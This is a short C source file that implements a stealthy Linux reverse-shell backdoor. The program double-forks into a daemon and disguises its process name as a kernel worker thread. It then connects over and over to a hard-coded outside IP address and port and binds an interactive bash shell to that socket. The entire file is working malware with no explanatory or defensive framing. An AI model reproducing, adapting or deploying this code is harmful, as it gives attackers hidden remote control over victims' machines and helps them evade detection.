#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/prctl.h>

#define SERVER_IP "154.18.239.136"
#define SERVER_PORT 4117
#define RECONNECT_DELAY 3

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    setsid();
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    chdir("/");

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_RDWR);
}

// ⬇️ Rename argv[0] + set kernel process name
void rename_proc(const char *name, char **argv) {
    prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
    strncpy(argv[0], name, strlen(argv[0]));
}

void connect_back() {
    int sockfd;
    struct sockaddr_in serv_addr;

    while (1) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            sleep(RECONNECT_DELAY);
            continue;
        }

        memset(&serv_addr, 0, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = inet_addr(SERVER_IP);
        serv_addr.sin_port = htons(SERVER_PORT);

        if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
            dup2(sockfd, 0);
            dup2(sockfd, 1);
            dup2(sockfd, 2);
            execl("/bin/bash", "bash", "-i", NULL);
            close(sockfd);
        } else {
            close(sockfd);
            sleep(RECONNECT_DELAY);
        }
    }
}

int main(int argc, char *argv[]) {
    daemonize();
    rename_proc("[kworker/u8:5-events]", argv);
    connect_back();
    return 0;
}
